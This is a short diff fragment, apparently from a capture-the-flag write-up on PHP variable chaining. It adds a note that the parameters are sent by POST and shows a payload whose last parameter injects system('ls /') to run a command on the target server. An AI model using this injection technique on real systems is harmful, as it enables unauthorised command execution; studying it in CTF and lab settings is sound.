@@ -60,5 +60,6 @@ for i in range(35):
 a+=s[i]+"="+code
 print(a)
 
+POST传递：
 _=a&a=b&b=......&I=J&J=system('ls /');
 ```
